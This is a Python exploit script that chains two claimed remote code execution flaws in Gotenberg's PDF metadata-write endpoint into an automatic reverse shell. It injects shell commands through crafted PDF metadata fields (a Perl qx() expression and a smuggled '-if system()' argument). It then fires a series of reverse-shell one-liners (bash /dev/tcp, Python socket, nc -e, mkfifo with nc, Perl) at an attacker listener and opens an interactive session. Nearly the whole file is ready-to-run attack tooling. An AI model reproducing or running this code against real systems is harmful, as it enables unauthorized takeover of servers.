#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto Reverse Shell — Gotenberg RCE Chain
Starts a listener, detects your IP, triggers the reverse shell,
and drops you into an interactive session.

Usage:
  python auto_revshell.py -u http://target:3000
  python auto_revshell.py -u http://target:3000 --lport 4444
  python auto_revshell.py -u http://target:3000 --lhost 1.2.3.4 --lport 4444
"""

import argparse
import base64
import json
import random
import re
import shutil
import socket
import string
import sys
import threading
import time
import zlib
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────── CONSTANTS ───────────────────────────────
PDF_MINIMAL = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 100] >>
endobj
xref
0 4
0000000000 65535 f
0000000010 00000 n
0000000062 00000 n
0000000122 00000 n
trailer
<< /Size 4 /Root 1 0 R >>
startxref
196
%%EOF
"""


# ────────────────────────────── COLORS ──────────────────────────────────
class C:
    R = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YEL = "\033[93m"
    CYAN = "\033[96m"
    MAG = "\033[95m"
    BOLD = "\033[1m"


def log(msg, color=""):
    print(f"{color}{msg}{C.R}", flush=True)


# ────────────────────────────── HELPERS ─────────────────────────────────
def randstr(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def get_public_ip():
    """Get public IP via multiple APIs."""
    apis = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com",
    ]
    for api in apis:
        try:
            r = requests.get(api, timeout=5)
            ip = r.text.strip()
            if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                return ip
        except Exception:
            continue
    return None


def get_local_ip():
    """Get local IP (which would reach 8.8.8.8)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def check_port_open(port):
    """Check if the port is already in use."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex(("127.0.0.1", port))
        s.close()
        return result == 0
    except Exception:
        return False


# ────────────────────────────── MULTIPART ───────────────────────────────
def build_multipart(boundary, filename, metadata, pdf=PDF_MINIMAL):
    parts = [
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="files"; filename="{filename}.pdf"\r\n'.encode(),
        b"Content-Type: application/pdf\r\n\r\n",
        pdf,
        f"\r\n--{boundary}\r\n".encode(),
        b'Content-Disposition: form-data; name="metadata"\r\n\r\n',
        metadata.encode() if isinstance(metadata, str) else metadata,
        f"\r\n--{boundary}--\r\n".encode(),
    ]
    return b"".join(parts)


# ────────────────────────────── CVE-2026-40281 ──────────────────────────
def _build_40281(cmd, boundary, filename):
    sm = "ZXQ" + randstr(10) + "S"
    em = "ZXQ" + randstr(10) + "E"
    shell_line = (
        f"echo\\$IFS'{sm}';"
        f"({cmd})2>&1|base64;"
        f"echo\\$IFS'{em}'"
    )
    perl_expr = f"${{PDFVersion;$_=qx(\"{shell_line}\")}}"
    metadata = json.dumps({"Title": f"{filename}\n-Title<{perl_expr}>"})
    return build_multipart(boundary, filename, metadata), sm, em


def _iter_streams(content):
    yield content
    for m in re.finditer(rb"stream\r?\n", content):
        s = m.end()
        e = content.find(b"endstream", s)
        if e == -1:
            continue
        chunk = content[s:e].rstrip(b"\r\n")
        try:
            yield zlib.decompress(chunk)
        except Exception:
            continue


def _extract_between_markers(content, sm, em):
    smb = sm.encode() if isinstance(sm, str) else sm
    emb = em.encode() if isinstance(em, str) else em
    for buf in _iter_streams(content):
        i = buf.find(smb)
        if i == -1:
            continue
        j = buf.find(emb, i + len(smb))
        if j == -1:
            continue
        payload = re.sub(rb"[^A-Za-z0-9+/=]", b"", buf[i + len(smb):j])
        try:
            return base64.b64decode(payload).decode("utf-8", "replace")
        except Exception:
            continue
    return None


def exploit_40281(target, cmd, timeout=60):
    boundary = "----WebKitFormBoundary" + randstr(16)
    filename = randstr(12)
    body, sm, em = _build_40281(cmd, boundary, filename)
    url = target.rstrip("/") + "/forms/pdfengines/metadata/write"
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    }
    try:
        r = requests.post(url, data=body, headers=headers,
                          verify=False, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        return None, f"request error: {str(e)[:100]}"

    if r.status_code == 500:
        out = _extract_between_markers(r.content, sm, em)
        if out is not None:
            return out, None
        return None, "RCE_OK_BUT_NO_OUTPUT"

    if r.status_code != 200:
        return None, f"HTTP {r.status_code}"

    out = _extract_between_markers(r.content, sm, em)
    if out is None:
        return None, "marker not found in response"
    return out, None


# ────────────────────────────── CVE-2026-42589 ──────────────────────────
def exploit_42589(target, cmd, timeout=60):
    boundary = "----BoundaryCVE" + randstr(8)
    filename = randstr(10)
    sm = "S42589" + randstr(8) + "S"
    em = "S42589" + randstr(8) + "E"
    payload_cmd = f"echo {sm}; ({cmd}) 2>&1 | base64; echo {em}"
    metadata = (
        '{"Title\\n'
        '-if\\n'
        f"system('{payload_cmd}')||1"
        '\\n-Comment":"x"}'
    )
    body = build_multipart(boundary, filename, metadata)
    url = f"{target.rstrip('/')}/forms/pdfengines/metadata/write"
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    }
    try:
        r = requests.post(url, data=body, headers=headers,
                          verify=False, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        return None, f"request error: {str(e)[:100]}"

    if r.status_code == 500:
        out = _extract_between_markers(r.content, sm, em)
        if out is not None:
            return out, None
        return None, "RCE_OK_BUT_NO_OUTPUT"

    if r.status_code != 200:
        return None, f"HTTP {r.status_code}"

    out = _extract_between_markers(r.content, sm, em)
    if out is None:
        return None, "marker not found in response"
    return out, None


# ────────────────────────────── UNIFIED ─────────────────────────────────
def exploit(target, cmd, timeout=60):
    out, err = exploit_40281(target, cmd, timeout)
    if out is not None:
        return out, "CVE-2026-40281", None
    err1 = err
    out, err = exploit_42589(target, cmd, timeout)
    if out is not None:
        return out, "CVE-2026-42589", None
    if err1 == "RCE_OK_BUT_NO_OUTPUT" or err == "RCE_OK_BUT_NO_OUTPUT":
        return None, "blind-500", "RCE_OK_BUT_NO_OUTPUT"
    return None, None, f"40281:{err1[:60]} | 42589:{err[:60]}"


# ────────────────────────────── CHECK ───────────────────────────────────
def check_target(target, timeout=20):
    marker = f"HACKFUT_{randstr(12)}"
    start = time.monotonic()
    out, engine, err = exploit(target, f"echo {marker}", timeout=timeout)
    elapsed = time.monotonic() - start

    if out and marker in out:
        return target, ("vulnerable", engine, elapsed), None

    if err == "RCE_OK_BUT_NO_OUTPUT" or (engine and "blind" in str(engine)):
        return target, ("vulnerable-blind", "blind", elapsed), None

    start = time.monotonic()
    _, _, _ = exploit(target, "sleep 8", timeout=timeout + 10)
    elapsed2 = time.monotonic() - start
    if elapsed2 >= 7.5:
        return target, ("vulnerable-blind", "blind", elapsed2), None

    if err:
        return target, None, err
    return target, None, f"no marker (elapsed={elapsed:.2f}s)"


# ────────────────────────────── REVERSE SHELL LISTENER ──────────────────
class RevShellListener:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.server = None
        self.conn = None
        self.addr = None
        self.ready = threading.Event()
        self.got_conn = threading.Event()

    def start(self):
        """Bind and accept in a background thread."""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(("0.0.0.0", self.lport))
            self.server.listen(1)
            self.server.settimeout(0.5)
            log(f"[+] Listener bound on 0.0.0.0:{self.lport}", C.GREEN)
            self.ready.set()

            # Accept loop in a thread
            threading.Thread(target=self._accept_loop, daemon=True).start()
            return True
        except OSError as e:
            log(f"[!] Failed to bind 0.0.0.0:{self.lport} — {e}", C.RED)
            log(f"    → Try another port with --lport", C.YEL)
            return False

    def _accept_loop(self):
        while not self.got_conn.is_set():
            try:
                self.conn, self.addr = self.server.accept()
                self.got_conn.set()
                return
            except socket.timeout:
                continue
            except OSError:
                return

    def wait_for_connection(self, timeout=30):
        """Wait for the target to call back."""
        return self.got_conn.wait(timeout=timeout)

    def interact(self):
        """Attach stdin/stdout to the reverse shell."""
        if not self.conn:
            log("[!] No connection", C.RED)
            return

        log(f"\n[*] Reverse shell from {self.addr[0]}:{self.addr[1]}", C.GREEN)
        log("[*] Type 'exit' to quit\n", C.CYAN)

        self.conn.settimeout(0.3)

        # Reader thread
        def reader():
            while True:
                try:
                    data = self.conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode("utf-8", "replace"))
                    sys.stdout.flush()
                except socket.timeout:
                    continue
                except Exception:
                    break
            log("\n[*] Connection closed by remote", C.YEL)

        threading.Thread(target=reader, daemon=True).start()

        # Writer loop (main thread)
        try:
            while True:
                line = sys.stdin.readline()
                if not line:
                    break
                self.conn.sendall(line.encode())
                if line.strip().lower() in ("exit", "quit"):
                    break
        except (KeyboardInterrupt, EOFError):
            pass
        finally:
            try:
                self.conn.close()
            except Exception:
                pass

    def stop(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception:
            pass
        try:
            if self.server:
                self.server.close()
        except Exception:
            pass


# ────────────────────────────── REVERSE SHELL PAYLOAD ───────────────────
def build_revshell_payloads(lhost, lport):
    """
    Build reverse shell commands (multiple fallbacks).
    Only one needs to work on the target.
    """
    payloads = []

    # 1) Bash /dev/tcp (most reliable on Linux)
    payloads.append(
        f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    )

    # 2) Bash /dev/tcp with explicit exec
    payloads.append(
        f"bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5 >&5;done'"
    )

    # 3) Python3 socket
    py = (
        f"import socket,subprocess,os;"
        f"s=socket.socket();s.connect(('{lhost}',{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call(['/bin/sh','-i'])"
    )
    payloads.append(f"python3 -c \"{py}\"")
    payloads.append(f"python -c \"{py}\"")

    # 4) nc traditional
    payloads.append(f"nc -e /bin/sh {lhost} {lport}")
    payloads.append(f"nc -c /bin/sh {lhost} {lport}")

    # 5) mkfifo + nc
    payloads.append(
        f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )

    # 6) Perl
    perl = (
        f"use Socket;$i='{lhost}';$p={lport};"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));"
        f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
        f"open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');"
        f"exec('/bin/sh -i');}}"
    )
    payloads.append(f"perl -e '{perl}'")

    # 7) curl-based (fetch + execute a script from our server)
    # Not used here because we have direct execution

    return payloads


# ────────────────────────────── BANNER ──────────────────────────────────
def banner():
    try:
        w = shutil.get_terminal_size((120, 24)).columns
    except Exception:
        w = 120
    def ctr(t):
        return " " * max(0, (w - len(t)) // 2) + t

    print()
    print(C.CYAN + C.BOLD + ctr("╔═══════════════════════════════════════════════╗") + C.R)
    print(C.CYAN + C.BOLD + ctr("║      AUTO REVERSE SHELL — GOTENBERG RCE       ║") + C.R)
    print(C.CYAN + C.BOLD + ctr("╚═══════════════════════════════════════════════╝") + C.R)
    print(C.YEL + ctr("CVE-2026-42589  +  CVE-2026-40281") + C.R)
    print(C.GREEN + ctr("Auto-detect IP + listener + trigger + interactive") + C.R)
    print()


# ────────────────────────────── MAIN ────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="Auto reverse shell for Gotenberg RCE"
    )
    ap.add_argument("-u", "--url", required=True, help="Target URL (http://host:3000)")
    ap.add_argument("--lhost", help="Your public IP (auto-detected if omitted)")
    ap.add_argument("--lport", type=int, default=4444, help="Listener port (default 4444)")
    ap.add_argument("--timeout", type=int, default=60)
    ap.add_argument("--no-banner", action="store_true")
    ap.add_argument("--wait", type=int, default=25,
                    help="Seconds to wait for the callback (default 25)")
    args = ap.parse_args()

    if not args.no_banner:
        banner()

    # ─── 1. Detect IP ────────────────────────────────────────────────
    if args.lhost:
        lhost = args.lhost
        log(f"[*] Using provided IP: {lhost}", C.CYAN)
    else:
        log("[*] Detecting public IP...", C.CYAN)
        lhost = get_public_ip()
        if lhost:
            log(f"[+] Public IP: {lhost}", C.GREEN)
        else:
            lhost = get_local_ip()
            log(f"[!] Public IP not found — using local: {lhost}", C.YEL)
            log(f"[!] The target may not reach you. Port-forward may be needed.", C.YEL)

    lport = args.lport

    # ─── 2. Start listener ──────────────────────────────────────────
    if check_port_open(lport):
        log(f"[!] Port {lport} already in use locally", C.RED)
        log(f"    → Use another port with --lport", C.YEL)
        return 1

    listener = RevShellListener(lhost, lport)
    if not listener.start():
        return 1

    # ─── 3. Detect vulnerability ────────────────────────────────────
    log(f"\n[*] Checking target: {args.url}", C.CYAN)
    target, result, error = check_target(args.url, timeout=args.timeout)

    if error:
        log(f"[-] {target} — {error}", C.YEL)
        listener.stop()
        return 1

    if not result:
        log(f"[-] {target} — no result", C.RED)
        listener.stop()
        return 1

    kind, engine, elapsed = result
    log(f"[+] Target is {kind.upper()} ({elapsed:.2f}s) — engine: {engine}", C.GREEN)

    if "vulnerable" not in kind:
        log(f"[-] Target not vulnerable — aborting", C.RED)
        listener.stop()
        return 1

    # ─── 4. Fire reverse shell payloads ─────────────────────────────
    log(f"\n[*] Sending reverse shell to {lhost}:{lport}...\n", C.CYAN)

    payloads = build_revshell_payloads(lhost, lport)
    for i, payload in enumerate(payloads, 1):
        log(f"    [{i}/{len(payloads)}] {payload[:80]}...", C.CYAN)
        out, eng, err = exploit(args.url, payload, timeout=args.timeout)

        # Wait a bit for the target to connect
        if listener.wait_for_connection(timeout=3):
            break
        time.sleep(0.3)

    # ─── 5. Wait for callback ───────────────────────────────────────
    log(f"\n[*] Waiting up to {args.wait}s for callback on {lhost}:{lport}...", C.CYAN)

    if not listener.wait_for_connection(timeout=args.wait):
        log(f"[-] No callback received", C.RED)
        log(f"\n[*] Diagnostics:", C.YEL)
        log(f"    1. Your IP: {lhost} — is it reachable from the target?", C.YEL)
        log(f"    2. Port {lport} — is it open in your firewall?", C.YEL)
        log(f"    3. If you're behind NAT, port-forward {lport} to your machine", C.YEL)
        log(f"    4. Try a VPS or ngrok if you can't receive inbound connections", C.YEL)
        listener.stop()
        return 1

    # ─── 6. Interactive ─────────────────────────────────────────────
    log(f"\n[+] CALLBACK RECEIVED from {listener.addr[0]}", C.GREEN)
    log(f"[*] Entering interactive shell. Type 'exit' to quit.\n", C.CYAN)

    listener.interact()
    listener.stop()

    log("\n[*] Session closed.", C.CYAN)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)